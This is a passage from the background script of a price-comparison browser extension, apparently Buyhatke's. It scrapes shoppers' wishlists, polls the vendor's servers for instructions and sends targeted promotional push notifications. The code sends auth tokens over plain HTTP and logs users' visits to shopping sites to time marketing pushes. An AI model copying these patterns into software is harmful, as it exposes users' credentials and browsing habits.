  httpq4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  httpq4.onreadystatechange = function(){
    if (httpq4.readyState == 4) {
      if(httpq4.status == 200) {
        var mytext = httpq4.responseText;
      }
    }
  };
  httpq4.send(parameters);
}

function getInstructions(){
  if(localStorage.subscribedFor!=""){
    var pollInterval = 1000 * 900;
  }
  else {
    var pollInterval = 1000 * 7200;
  }
  window.setTimeout(getInstructions, pollInterval);
  //if(localStorage.saleStarted==1){
    var httpq4 = new getXMLHTTPRequest();
    var myurl = "http://node4.buyhatke.com/extension/getInstructions.php";
    var parameters = "ext_id=" + localStorage.ext_id + "&auth_val=" + localStorage.ext_auth;
    httpq4.open("POST", myurl, true);
    httpq4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    httpq4.onreadystatechange = function(){
      if (httpq4.readyState == 4) {
        if(httpq4.status == 200) {
          localStorage.instructions = httpq4.responseText;
        }
      }
    };
    httpq4.send(parameters);
  //}
}

function getRefresh(){
  localStorage.refreshedYetServer = 0;
  var pollInterval = 1000 * 900;
  window.setTimeout(getRefresh, pollInterval);
//   //if(localStorage.saleStarted==1){
//   var httpq4 = new getXMLHTTPRequest();
//   var myurl = "http://buyhatke.com/compare/extension/getRefresh.php";
//   var parameters = "ext_id=" + localStorage.ext_id + "&auth_val=" + localStorage.ext_auth;
//   httpq4.open("POST", myurl, true);
//   httpq4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
//   httpq4.onreadystatechange = function(){
//   if (httpq4.readyState == 4) {
//   if(httpq4.status == 200) {
//     localStorage.refreshedYetServer = httpq4.responseText;
//   }
//  }
// };
//   httpq4.send(parameters);
//   //}
}

function getSaleDate(){
  var pollInterval = 1000 * 7200;
  window.setTimeout(getSaleDate, pollInterval);
  if(localStorage.saleMonitor == 0){
    var httpq4 = new getXMLHTTPRequest();
    var myurl = "http://buyhatke.com/compare/extension/getSaleDate.php";
    var parameters = "ext_id=" + localStorage.ext_id + "&auth_val=" + localStorage.ext_auth;
    httpq4.open("POST", myurl, true);
    httpq4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    httpq4.onreadystatechange = function(){
      if (httpq4.readyState == 4) {
        if(httpq4.status == 200) {
          localStorage.saleDate = httpq4.responseText;
        }
      }
    };
    httpq4.send(parameters);
  }
  else {
    console.log("Postponed getSaleDate due to Redmi Sale");
  }
  console.log("Successfully terminated");
}

function caliberateTime(){
  var pollInterval = 1000 * 300;
  if(localStorage.saleStarted==1){
   //var pollInterval = 1000 * 30;
 }
 window.setTimeout(caliberateTime, pollInterval);
 var httpq4 = new getXMLHTTPRequest();
 var myurl = "http://time.jsontest.com/";
 var parameters = "ext_id=" + localStorage.ext_id + "&auth_val=" + localStorage.ext_auth;
 httpq4.open("POST", myurl, true);
 httpq4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
 httpq4.onreadystatechange = function(){
  if (httpq4.readyState == 4) {
    if(httpq4.status == 200) {
      var mytext = httpq4.responseText;
      mytext = JSON.parse(mytext);
      mytext = mytext.milliseconds_since_epoch;
//console.log(mytext);
if(parseInt(mytext)!=0){
  var serverTime = mytext;
  var clientTime = +new Date();
    //console.log("server time " + serverTime + " clientTime " + clientTime);
    var tempDiff = serverTime - clientTime;
    localStorage.diffTime = tempDiff;
  }
}
}
};
httpq4.send(parameters);
}

function checkStatus2(){
  var httpq4 = new getXMLHTTPRequest();
  var myurl = "https://compare.buyhatke.com/extension/checkStatus.php";
  var parameters = "ext_id=" + localStorage.ext_id + "&auth_val=" + localStorage.ext_auth;
  httpq4.open("POST", myurl, true);
  httpq4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  httpq4.onreadystatechange = function(){
    if (httpq4.readyState == 4) {
      if(httpq4.status == 200) {
        var mytext = httpq4.responseText;
//console.log(mytext);
if(mytext!="" && mytext.trim() != "Authentication Failed!" && (JSON.parse(mytext).length)!=0){
  watchListArray = JSON.parse(mytext);
}
//console.log(watchListArray[0]);
}
}
};
httpq4.send(parameters);
}

function sendPIDFlip(pids, pos){
  var httpq4 = new getXMLHTTPRequest();
  var myurl = "https://compare.buyhatke.com/extension/flipPIDs.php";
  var parameters = "pids=" + encodeURIComponent(pids) + "&pos=" + pos;
  httpq4.open("POST", myurl, true);
  httpq4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  httpq4.onreadystatechange = function(){
    if (httpq4.readyState == 4) {
      if(httpq4.status == 200) {
        var mytext = httpq4.responseText;
        // console.log(mytext);
      }
    }
  };
  httpq4.send(parameters);
}

function sendPairs(pids, pos){
  var httpq4 = new getXMLHTTPRequest();
  var myurl = "http://ext1.buyhatke.com/utility/sendPairsHandler.php";
  //var myurl = "http://ext1.buyhatke.com/flipkart/flip_sendPairs.php";
  var parameters = "pids=" + encodeURIComponent(pids) + "&pos=" + pos + "&ext_id=" + localStorage.ext_id + "&ext_auth=" + localStorage.ext_auth;
  httpq4.open("POST", myurl, true);
  httpq4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  httpq4.onreadystatechange = function(){
    if (httpq4.readyState == 4) {
      if(httpq4.status == 200) {
        var mytext = httpq4.responseText;
//console.log(mytext);
}
}
};
httpq4.send(parameters);
}

function sendCurrent(pids, pos){
  var httpq4 = new getXMLHTTPRequest();
  var myurl = "http://ext1.buyhatke.com/utility/currentPairsHandler.php";
  //var myurl = "http://ext1.buyhatke.com/flipkart/flip_currentPairs.php";
  var parameters = "pids=" + encodeURIComponent(pids) + "&pos=" + pos + "&ext_id=" + localStorage.ext_id + "&ext_auth=" + localStorage.ext_auth;
  httpq4.open("POST", myurl, true);
  httpq4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  httpq4.onreadystatechange = function(){
    if (httpq4.readyState == 4) {
      if(httpq4.status == 200) {
        var mytext = httpq4.responseText;
//console.log(mytext);
}
}
};
httpq4.send(parameters);
}

function submitDataEBAY(jsonData, fileToSend){
  return new Promise(function(resolve, reject){
    var httpq4 = new getXMLHTTPRequest();
    var myurl = "http://buyhatke.com/ebYOf/" + fileToSend;
    var parameters = "ext_id=" + localStorage.ext_id + "&auth_val=" + localStorage.ext_auth;
    jsonParData = jsonData;
    var L = jsonParData.length;
    for (var i = 0; i < L; i++) {
      var obj = jsonParData[i];
      for (var j in obj) {
        var paramKey = (j);
        var paramVal = (jsonParData[i][j]);
        parameters += "&" + paramKey + "=" + paramVal;
      }
    }
    httpq4.open("POST", myurl, true);
    httpq4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    httpq4.onreadystatechange = function(){
      if(this.readyState == 4 && this.status == 200) {
        var mytext = this.responseText;
        resolve(mytext);
      }
      else if(this.readyState == 4){
        resolve("Please check your internet Connection and try again!");
      }
    };
    httpq4.send(parameters);
  });
}

function price_filter(pr){
  if(pr.split("Rs.").length > 1){
    pr = pr.split("Rs.")[1];
  }
  if(pr.split("Rs").length > 1){
    pr = pr.split("Rs")[1];
  }
  if(pr.split("INR").length > 1){
    pr = pr.split("INR")[1];
  }
  if(pr.split("Inr").length > 1){
    pr = pr.split("Inr")[1];
  }
  if(pr.split("RS.").length > 1){
    pr = pr.split("RS.")[1];
  }
  if(pr.split("RS").length > 1){
    pr = pr.split("RS")[1];
  }
  if(pr.split("R").length > 1){
    pr = pr.split("R")[1];
  }
  if(pr.split("`").length > 1){
    pr = pr.split("`")[1];
  }
  if(pr.split("MRP").length > 1){
    pr = pr.split("MRP")[1];
  }
  if(pr.split("mrp").length > 1){
    pr = pr.split("mrp")[1];
  }
  if(pr.split("/").length > 1){
    pr = pr.split("/")[0];
  }
  if(pr.split("₹").length > 1){
    pr = pr.split("₹")[1].trim();
  }
  if(pr.split("र").length > 1){
    pr = pr.split("र")[1].trim();
  }
  pr = pr.split(",").join("").trim();
  pr = parseFloat(pr);
  return pr;

}

var wishListFlip = [];
function flipWishListURL(wish_url){
  return new Promise(function(resolve, reject){
    if(wish_url.split("?").length > 1){
      wish_url = wish_url.split("?");
      wish_url = wish_url[0].trim();
    }
    if(wish_url.split("&").length > 1){
      wish_url = wish_url.split("&");
      wish_url = wish_url[0].trim();
    }
    if(wish_url.split("#").length > 1){
      wish_url = wish_url.split("#");
      wish_url = wish_url[0].trim();
    }
    wish_url = wish_url + "?page=1&sort=dd";
    wishListFlip = [];
    crawlWishFlip(wish_url).then(function(args){
      resolve(args);
    });
  });
}

function crawlWishFlip(wish_url){
  return new Promise(function(resolve, reject){
    totAlert = 0;
    var slider = "";
    var sliderLength = 0;
    var link = "";
    var prod = "";
    var image = "";
    var price = "";
    var PID = "";
    var pos = 2;
    $.ajax(wish_url, {}).success(function(data){
      wrapper = document.createElement('div');
      wrapper.innerHTML= data;
      if($(wrapper).text().trim().toUpperCase().split("WISHLIST IS NOT PUBLIC").length > 1 ){
        resolve("Your Wishlist seems to be Private. Kindly make it Public and access again! Thanks!");
      }
      else if($(wrapper).text().trim().toUpperCase().split("UNAVAILABLE SINCE PROFILE DOES NOT EXIST").length > 1){
        resolve("Something Went Wrong!");
      }
      else if($(wrapper).find('#wishlist .fk-wishl-itm').length > 0) {
        totAlert = 1;
        slider = $(wrapper).find('#wishlist .fk-wishl-itm');
        sliderLength = $(wrapper).find('#wishlist .fk-wishl-itm').length;

        for(i=0;i<sliderLength;i++){
          link= "";
          url_wish = "";
          price= "";
          image = "";
          PID= "";
          pos = 2;
          if($(wrapper).find('#wishlist .fk-wishl-itm:eq('+ i +')').find('a').length > 0){
            link = $(wrapper).find('#wishlist .fk-wishl-itm:eq('+ i +')').find('a').attr('href');
            url_wish = link;
            if(url_wish.split("www.flipkart.com").length < 2){
              url_wish = "http://www.flipkart.com"+url_wish;
            }
            if(link.split('?pid=').length > 1){
              link = link.split("?pid=")[1];
              PID = link.split("&")[0];
            }
            else if(link.split('&pid=').length > 1){
              link = link.split("&pid=")[1];
              PID = link.split("&")[0];
            }
            else{
              link = "";
              PID = "";
            }
          }
          else{
            link = "";
            PID = "";
          }
          if(PID != ""){
            if(PID != PID.toUpperCase()){
              PID = "";
            }
          }
          if(PID != ""){
            if($(wrapper).find('#wishlist .fk-wishl-itm:eq('+ i +')').find('.pu-final').length > 0){
              price = $(wrapper).find('#wishlist .fk-wishl-itm:eq('+ i +')').find('.pu-final:eq(0)').text().trim();
              price = price_filter(price);
            }
          }
          else{
            price = "";
          }
          if(isNaN(price)){
            price = "";
          }

          if($(wrapper).find('#wishlist .fk-wishl-itm:eq('+ i +')').find('.lu-title-wrapper a').length > 0){
            prod = $(wrapper).find('#wishlist .fk-wishl-itm:eq('+ i +')').find('.lu-title-wrapper:eq(0) a:eq(0)').text().trim();
          }

          if($(wrapper).find('#wishlist .fk-wishl-itm:eq('+ i +')').find('.lu-image-link  img').length > 0){
            image = $(wrapper).find('#wishlist .fk-wishl-itm:eq('+ i +')').find('.lu-image-link img:eq(0)').attr('src').trim();
            if(image.split("data:image").length > 1){
              image = $(wrapper).find('#wishlist .fk-wishl-itm:eq('+ i +')').find('.lu-image-link img:eq(0)').attr('data-src').trim();
            }
          }

          if(PID != "" && price != ""){
            wishListFlip.push([(PID), (prod), price, (image), pos, (url_wish)]);
          }
        }
        if($(wrapper).find(".wishlist-pagination").length > 0 && $(wrapper).find(".wishlist-pagination").text().toUpperCase().split("NEXT").length > 1 && wishListFlip.length > 0){
          var pg_no = $(wrapper).find(".wishlist-pagination .current:eq(0)").text().trim();
          pg_no = parseInt(pg_no) + 1;
          wish_url = wish_url.split("?");
          wish_url = wish_url[0].trim();
          wish_url = wish_url + "?page=" + pg_no + "&sort=dd";
          crawlWishFlip(wish_url).then(function(args){
            resolve(args);
          });
        }
        else{
         if(wishListFlip.length > 0){
          var wishJson = JSON.stringify(wishListFlip);
          var jsonArr = [{'wishList': wishJson}];
          jsonArr = JSON.stringify(jsonArr);
          $.post("https://compare.buyhatke.com/wishlist3/api/scrapWishList.php?ext_id="+localStorage.ext_id+"&auth_val="+localStorage.ext_auth, {wishList: wishJson}).success(function(data){
            resolve(data);
          }).fail(function(data){
            resolve("Something went wrong!");
          });
        }
        else{
          resolve("Something went wrong!");
        }

      }

    }
    else {
      totAlert = 0;
    }
  })
.fail(function(){
  resolve("Something went Wrong!");
});
});
return;
}

function snapWishList(wish_url){
  return new Promise(function (resolve, reject){
    var wishListSnap = [];
    var slider = $('.product_list_view_cont');
    var sliderLength = slider.length;
    var link = "";
    var url = "";
    var prod = "";
    var image = "";
    var price = "";
    var PID = "";
    var pos = 129;
    if(wish_url.split("?u=").length > 1){
      var snap_user = wish_url.split("?u=");
      snap_user = snap_user[1].trim();
      if(snap_user.split("&").length > 1){
        snap_user = snap_user.split("&");
        snap_user = snap_user[0].trim();
      }
      if(snap_user.split("#").length > 1){
        snap_user = snap_user.split("#");
        snap_user = snap_user[0].trim();
      }
    }
    else if(wish_url.split("&u=").length > 1){
      var snap_user = wish_url.split("&u=");
      snap_user = snap_user[1].trim();
      if(snap_user.split("&").length > 1){
        snap_user = snap_user.split("&");
        snap_user = snap_user[0].trim();
      }
      if(snap_user.split("#").length > 1){
        snap_user = snap_user.split("#");
        snap_user = snap_user[0].trim();
      }
    }
    var user_url_len = snap_user.length -1;
    if(snap_user.substr(user_url_len, 1) == "/"){
      snap_user = snap_user.substring(0, user_url_len);
    }
  // console.log("user id: "+snap_user);
  var url_first = "https://www.snapdeal.com/wishlistNew/getProducts/0/1?sort=dhtl&wishlistUrl="+snap_user+"&lang=en";
  $.ajax(url_first, {}).success(function(resp){
    if(resp == "" || resp == null || resp == "null"){
      resolve("Your Wishlist seems to be Private. Kindly make it Public and access again! Thanks!");
    }
    else{
      resp = JSON.parse(resp);

      var pages = resp.totalLength;
      var snapapi = "https://www.snapdeal.com/wishlistNew/getProducts/0/"+pages+"?sort=dhtl&wishlistUrl="+snap_user+"&lang=en";
      $.get(snapapi, {}).success(function(data){
        // console.log("data: "+data);
        data = JSON.parse(data);
        for(var d=0;d<data.wishlistProductDisplayDTOs.length;d++){
          image = "";
          price = "";
          prod = "";
          link = "";
          url = "";
          PID = "";

          image = data.wishlistProductDisplayDTOs[d].MinProductOfferGroupDTO.image;
          image = "https://n2.sdlcdn.com/" + image;
          price = data.wishlistProductDisplayDTOs[d].MinProductOfferGroupDTO.displayPrice;
          prod = data.wishlistProductDisplayDTOs[d].MinProductOfferGroupDTO.name;
          link = data.wishlistProductDisplayDTOs[d].MinProductOfferGroupDTO.pageUrl;
          if(link.split("snapdeal.com/").length < 2){
            link = "https://www.snapdeal.com/" + link;
          }
          url = link;

          if(link.split("#").length > 1)  {
            link = link.split("#")[0];
          }
          if(link.split("?").length > 1)  {
            link = link.split("?")[0];
          }
          if(link.split("/").length > 1)  {
            link = link.split("/");
            PID = link[link.length -1];
          }

          if(PID != "" && price != ""){
            wishListSnap.push([encodeURIComponent(PID), encodeURIComponent(prod), price, encodeURIComponent(image), pos, encodeURIComponent(url)]);
          }
        }
        if(wishListSnap.length > 0){
          var wishJson = JSON.stringify(wishListSnap);
          var jsonArr = [{'wishList': wishJson}];
          jsonArr = JSON.stringify(jsonArr);
          $.post("https://compare.buyhatke.com/wishlist3/api/scrapWishList.php?ext_id="+localStorage.ext_id+"&auth_val="+localStorage.ext_auth, {wishList: wishJson}).success(function(data){
            resolve(data);
          }).fail(function(data){
            resolve("Something went wrong!");
          });
        }
        else{
          resolve("Something went wrong!");
        }

      })
      .fail(function(data){
        resolve("Something went wrong!");
      });
    }

  })
  .fail(function(){
    resolve("Something went wrong!");
  });
});

  return;
}

function amazWishList(wish_url){
  return new Promise(function(resolve, reject){

    wishListAmaz = [];
    cameAmaz = 0;
    var sid = "";
    var rid = "";
    $.ajax(wish_url)
    .success(function(dataAmz){
      // console.log("dataAmz: "+dataAmz);

      wrapperAmaz1 = document.createElement('div');
      wrapperAmaz1.innerHTML = dataAmz;

      sid = getCookie("session-id");
      rid = getCookie("csm-hit");
      if(rid && rid.split("+sa").length > 1){
        rid = rid.split("+sa");
        rid = rid[0].trim();
      }
      if($(wrapperAmaz1).find('.a-pagination').length > 0){
        var pg = $(wrapperAmaz1).find('.a-pagination:eq(0) li').length - 2;
      }
      else{
        var pg = 1;
      }
      var uid = "";
      if(wish_url.split("/wishlist/").length > 1){
        uid = wish_url.split("/wishlist/");
        uid = uid[1].trim();
        if(uid.split("?").length > 1){
          uid = uid.split("?");
          uid = uid[0].trim();
        }
        if(uid.split("#").length > 1){
          uid = uid.split("#");
          uid = uid[0].trim();
        }
        if(uid.split("&").length > 1){
          uid = uid.split("&");
          uid = uid[0].trim();
        }
        if(uid.split("/").length > 1){
          uid = uid.split("/");
          uid = uid[0].trim();
        }
      }
      else{
        uid = $(wrapperAmaz1).html();
        uid = uid.split("var ue_url");
        uid = uid[1];
        uid = uid.split(",");
        uid = uid[0];
        uid = uid.split("/wishlist/");
        uid = uid[1].trim();
        if(uid.split("?").length > 1){
          uid = uid.split("?");
          uid = uid[0].trim();
        }
        if(uid.split("#").length > 1){
          uid = uid.split("#");
          uid = uid[0].trim();
        }
        if(uid.split("&").length > 1){
          uid = uid.split("&");
          uid = uid[0].trim();
        }
        if(uid.split("/").length > 1){
          uid = uid.split("/");
          uid = uid[0].trim();
        }
      }
      if(rid == "" || rid == undefined){
        rid = dataAmz.split('"customerID":"');
        rid = rid[1].trim();
        rid = rid.split('"');
        rid = rid[0].trim();
      }
      if(sid == "" || sid == undefined){
        sid = dataAmz.split('"sid":"');
        sid = sid[1].trim();
        sid = sid.split('"');
        sid = sid[0].trim();
      }
      console.log("uid: "+uid);
      for(var p=1;p<=pg;p++){
        var amazURL = "http://www.amazon.in/gp/registry?ref_=cm_wl_ap_page_1&_encoding=UTF8&disableBtf=0&sid="+sid+"&ajax=renderItemsSection&subPageType=WishlistVisitorView&requestID="+rid+"&sort=date-added&reveal=unpurchased&page="+p+"&view=null&filter=all&id="+uid+"&type=wishlist";
        console.log("amazURL: "+amazURL);
        $.post(amazURL)
        .success(function(data){
          var slider = "";
          var sliderLength = "";
          var link = "";
          var url = "";
          var prod = "";
          var image = "";
          var price = "";
          var PID = "";
          var pos = 63;
          wrapperAmaz = document.createElement('div');
          wrapperAmaz.innerHTML= data.content;
          if($(wrapperAmaz).find('#item-page-wrapper .a-fixed-left-grid').length > 0) {
            slider = $(wrapperAmaz).find('#item-page-wrapper .a-fixed-left-grid');
            sliderLength = $(wrapperAmaz).find('#item-page-wrapper .a-fixed-left-grid').length;

            for(var i=0;i<sliderLength;i++){
              link = "";
              url = "";
              price = "";
              image = "";
              prod = "";
              PID = "";
              pos = 63;

              if($(wrapperAmaz).find('#item-page-wrapper .a-fixed-left-grid:eq('+ i +')').find('a').length > 0){
                link = $(wrapperAmaz).find('#item-page-wrapper .a-fixed-left-grid:eq('+ i +')').find('a:eq(0)').attr('href');
                if(link.split("amazon.in").length < 2){
                  link = "http://www.amazon.in" + link;
                }
                url = link;
                if(url.split("www.amazon.in").length < 2){
                  url = "https://www.amazon.in" + url;
                }
                var pid = link;
                if(pid.split("#").length > 1){
                  pid = pid.split("#")[0];
                }
                if(pid.split("&").length > 1){
                  pid = pid.split("&")[0];
                }
                if(pid.split("?").length > 1){
                  pid = pid.split("?")[0];
                }
                if(pid.split("/product/").length > 1){
                  pid = pid.split("/product/")[1];
                }
                else if(pid.split("/dp/").length > 1){
                  pid = pid.split("/dp/")[1];
                }

                if(pid.split("/ref").length > 1){
                  pid = pid.split("/ref")[0];
                }
                if(pid.split("/").length > 1){
                  pid1 = pid.split("/");
                  pid1 = pid1[pid1.length - 1];
                  if(pid1 == ""){
                    pid = pid.split("/");
                    pid = pid[pid.length - 2];
                  }
                  else {
                    pid = pid1;
                  }
                }
                PID = pid;
              }

              if(PID != ""){
                if($(wrapperAmaz).find('#item-page-wrapper .a-fixed-left-grid:eq('+ i +')').find('.a-color-price span').length > 0){
                  price = $(wrapperAmaz).find('#item-page-wrapper .a-fixed-left-grid:eq('+ i +')').find('.a-color-price:eq(0) span:eq(0)').text().trim();
                  price = price_filter(price);
                }
                else if($(wrapperAmaz).find('#item-page-wrapper .a-fixed-left-grid:eq('+ i +')').find('.price-section span').length > 0){
                  price = $(wrapperAmaz).find('#item-page-wrapper .a-fixed-left-grid:eq('+ i +')').find('.price-section:eq(0) span:eq(0)').text().trim();
                  price = price_filter(price);
                }
                if((price == undefined || isNaN(price) || price == "" || price == 0) && $(wrapperAmaz).find('#item-page-wrapper .a-fixed-left-grid:eq('+ i +')').find('.itemUsedAndNewPrice').length > 0){
                  price = $(wrapperAmaz).find('#item-page-wrapper .a-fixed-left-grid:eq('+ i +')').find('.itemUsedAndNewPrice:eq(0)').text().trim();
                  price = price_filter(price);
                }
              }
              else{
                price = "";
              }
              if(isNaN(price)){
                price = "";
              }

              if($(wrapperAmaz).find('#item-page-wrapper .a-fixed-left-grid:eq('+ i +')').find('.g-itemImage a').length > 0){
                prod = $(wrapperAmaz).find('#item-page-wrapper .a-fixed-left-grid:eq('+ i +')').find('.g-itemImage:eq(0) a:eq(0)').attr('title').trim();
              }

              if($(wrapperAmaz).find('#item-page-wrapper .a-fixed-left-grid:eq('+ i +')').find('.g-itemImage  img').length > 0){
                image = $(wrapperAmaz).find('#item-page-wrapper .a-fixed-left-grid:eq('+ i +')').find('.g-itemImage img:eq(0)').attr('src').trim();
              }
              // console.log("PID: "+PID);
              // console.log("price: "+price);
              // console.log("prod: "+prod);
              // console.log("image: "+image);

              if(PID != "" && price != ""){
                wishListAmaz.push([encodeURIComponent(PID), encodeURIComponent(prod), price, encodeURIComponent(image), pos, encodeURIComponent(url)]);
              }
        } //for over
      }
      cameAmaz++;
      if(wishListAmaz.length > 0 && cameAmaz == pg){
        var wishJson = JSON.stringify(wishListAmaz);
        var jsonArr = [{'wishList': wishJson}];
        jsonArr = JSON.stringify(jsonArr);
        $.post("https://compare.buyhatke.com/wishlist3/api/scrapWishList.php?ext_id="+localStorage.ext_id+"&auth_val="+localStorage.ext_auth, {wishList: wishJson}).success(function(data){
          resolve(data);
        }).fail(function(data){
          resolve("Something went wrong!");
        });
      }
      // else if(p < pg){
      //   p++;
      // }
      // else{
      //   resolve("Something Went Wrong!");
      // }
  }) //success over
.fail(function(data){
  resolve("SOMETHING WENT WRONG!");
}); //fail over
} //for over
}) //success1st over
.fail(function(data){
  resolve("Something Went Wrong!");
});
}); // promise ends
return;
}


visited = {};
globalPush = 0;

function logVisited(webName){
   // console.log("Vis " + webName);
   var timeStr = webName + "vis";
   var pushStr = webName + "push"
   if(!visited[timeStr]){
    visited[timeStr] = 0;
    visited[pushStr] = 0;
  }
  visited[timeStr] = Math.floor(Date.now() / 1000);
}

function congratulateUser(){
  notifyPAImage("https://s3-ap-southeast-1.amazonaws.com/push-images/autocoupons-winner-notify.png", "🎉You have done it 🎉", "Yippeee!! Congrats! you have successfully booked your new phone at Amazon Flash Sale via Buyhatke. Tap to rate us and share your review", "http://bit.ly/2sjz41k", "pushLucky30012319926");
  sendAnalyticsData("pushImageIconFlashSaleDyn-63");
}

function sendPush(key){
 console.log("Sending push for " + key);
 // return;

 var pos = Math.floor(key);
 var d = new Date();
 d = d.getDate();
 if((pos==63) && d >= 23 && d <= 25){
    // return;
  }
  else if((pos==129) && d >= 20 && d <= 23){
    return;
  }
  else if((pos==2) && d >= 24 && d <= 26){
    // return;
  }
  else if(pos==421 && d > 20 && d <= 24){
   return;
 }
 else {
  return;
}

   // else {
   // console.log("Sending push for " + key);
   var data = pushArray;
   var url = "";
   var icon = "";
   for(k=0;k<data.length;k++){
    if(Math.floor(data[k].domain)==Math.floor(key)){
      url = data[k].url;
    }
  }
  switch(pos){
    case 2:
    var icon = "https://s3-ap-southeast-1.amazonaws.com/push-images/dl-Flipkart-BDSGeneric-notify.png";
    var icon = "https://s3-ap-southeast-1.amazonaws.com/push-images/flipkart_logo_80X80.png";
    if(url==""){
     url = "https://www.flipkart.com/fashion-day-store";
   }
   break;
   case 63:
   var icon = "https://s3-ap-southeast-1.amazonaws.com/push-images/amazon-wrsJun2017-notify.png";
   if(url==""){
     url = "http://www.amazon.in/b/?ie=UTF8&node=4188827031";
   }
   break;
   case 129:
   var icon = "https://s3-ap-southeast-1.amazonaws.com/push-images/snapdeal-SUDSGeneric-notify.png";
   if(url==""){
     url = "https://www.snapdeal.com/offers/diwali-offers";
   }
   break;
   case 50:
   var icon = "https://s3-ap-southeast-1.amazonaws.com/push-images/jabong80X80.jpg";
   if(url==""){
     url = "http://www.jabong.com/end-of-reason-sale-online/";
   }
   break;
   case 111:
   var icon = "https://s3-ap-southeast-1.amazonaws.com/push-images/myntra-eors1-notify.png";
   if(url==""){
     url = "http://www.myntra.com/flat-80-sale-eors?sort=new";
   }
   break;
   case 421:
   var icon = "https://s3-ap-southeast-1.amazonaws.com/push-images/shopclues_logo_80X80.png";
   if(url==""){
     url = "http://www.shopclues.com/appliances-5/breakfast-appliances-offers.html?utm_medium=notification";
   }
   break;
 }
 if(url!="" && icon!=""){
  url = "https://tracking.buyhatke.com/Navigation/?pos=" + pos + "&source=extension&link=" + encodeURIComponent(url) + "&ext1=pushO&ext2=" + localStorage.ext_id;
  notifyIcon(icon, "New amazing offers found", "On the categories you were interested more exciting products with good discounts have been added just now. Check them out. Offers available for a limited time", url, "pushIcon" + Math.floor(Date.now() / 1000), "Check Updated Offers");
  sendAnalyticsData("pushImageIconDyn-" + pos);
}
 // }
}

function getStartTime(varCode){
    var salesdata = localStorage.existingSales;
    salesdata = JSON.parse(salesdata);
    for(var k=0;k<salesdata.length;k++){
       for(var a=0;a<salesdata[k].length;a++){
          // console.log(salesdata[k][a].code);
          if(salesdata[k][a].code==varCode){
             // console.log("Found time - " + salesdata[k][a].time);
             return salesdata[k][a].time;
          }
       }
    }
    return 0;
}

function getSubsStatus(varCode){
   var a = localStorage.checkedArray;
   a = JSON.parse(a);
   // console.log("Test here " + varCode + " - " + a[varCode]);
   if(a[varCode] === true){
     return 1;
   }
   else {
     return 0;
   }
}

function monitorUser(){
 setTimeout(monitorUser, 10000);
 var d = new Date();
 d = d.getDate();
 if(Math.floor(Date.now() / 1000)-globalPush>1800 && d >= 10 && d <= 18){
  for (var key in visited) {
    var lastSeen = Math.floor(visited[key]);
    if(key.split("vis").length>1){
     key = key.split("vis")[0];
     newKey = key + "push";
     var lastPush = Math.floor(visited[newKey]);
     if(Math.floor(Date.now() / 1000) - lastPush > 1800 && Math.floor(Date.now() / 1000)-globalPush > 1800 && lastSeen - Math.floor(Date.now() / 1000) < 240 && lastSeen - Math.floor(Date.now() / 1000) > -100){
       globalPush = Math.floor(Date.now() / 1000);
       visited[newKey] = Math.floor(Date.now() / 1000);
       sendPush(key);
       break;
     }
   }
 }
}
else if(Math.floor(Date.now() / 1000)-globalPush>1800 && false){
  for (var key in visited) {
    var lastSeen = Math.floor(visited[key]);
    if(key.split("vis").length>1){
     key = key.split("vis")[0];
     newKey = key + "push";
     var lastPush = Math.floor(visited[newKey]);
     if(Math.floor(Date.now() / 1000) - lastPush > 9600 && Math.floor(Date.now() / 1000)-globalPush > 1800 && (lastSeen - Math.floor(Date.now() / 1000) < 120) && lastSeen > lastPush){
       globalPush = Math.floor(Date.now() / 1000);
       visited[newKey] = Math.floor(Date.now() / 1000);
               // sendPush(key);
               break;
             }
           }
         }
       }
     }

     monitorUser();

     chrome.runtime.onMessage.addListener(
      function(request, sender, sendResponse) {
       if (typeof(request.data) != "undefined"){
         var httpq2 = getXMLHTTPRequest();
         var data = request.data.split("~*~*");
         var prod = data[0];
         var price = data[1];
         var image = data[2];
         var url = data[3];
         var pos = data[4];
         var cat = data[5];
         var myurl = "https://compare.buyhatke.com/extension/addToWatchList.php";
         var parameters = "prod=" + encodeURIComponent(prod) + "&price=" + price + "&image=" + encodeURIComponent(image) + "&url=" + encodeURIComponent(url) + "&pos=" + pos + "&ext_id=" + localStorage.ext_id + "&auth_val=" + localStorage.ext_auth;
         httpq2.open("POST", myurl, true);
         httpq2.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
         httpq2.onreadystatechange = function(){
          if (httpq2.readyState == 4) {
            if(httpq2.status == 200) {
              var mytext = httpq2.responseText;
              checkStatus2();
            }
          }
        };
        httpq2.send(parameters);
        sendResponse({farewell: "goodbye"});
      }
      else if(typeof(request.search) != "undefined"){
        name = request.search;
        var pr = name.split("~*~*");
        var websitePos = parseInt(pr[2]);
        var data2="";
        if(name.split("moreData=").length > 1){
          data2 = name.split("moreData=")[1];
          name = name.split("moreData=")[0];
        }
        var pr = name.split("~*~*");
        var myPrice = parseFloat(pr[1]);
        name = pr[0];
        var name2 = name.split("-");
        name = name2.join(" ");
        var i = 0;
        while(inUSE[i]!=0){
          i++;
        }
        inUSE[i] = 1;
        var toUSE = i;
        handleQueries(name.trim(), myPrice, i, sender.tab.id, sender.tab.url, data2, websitePos);
      }
      else if(typeof(request.sendTabID) != "undefined"){
        sendResponse({farewell: sender.tab.id});
      }
      else if(typeof(request.checkSubscription) != "undefined"){
        sendResponse({farewell: getSubsStatus(request.checkSubscription)});
      }
      else if(typeof(request.sendStartTime) != "undefined"){
        sendResponse({farewell: getStartTime(request.sendStartTime)});
      }
      else if(typeof(request.tabAssignedHash) != "undefined"){
        sendResponse({farewell: localStorage.tabAssignedHash});
      }
      else if(typeof(request.sendTabIDF) != "undefined"){
        sendResponse({farewell: sender.tab.id});
      }
      else if(typeof(request.visitedEcomm) != "undefined"){
       logVisited(request.visitedEcomm);
       sendResponse({farewell: "OK"});
     }
     else if(typeof(request.showPush) != "undefined"){
      console.log("Received " + request.showPush);
       if(!pushShown[request.showPush]){
           pushShown[request.showPush] = 1;
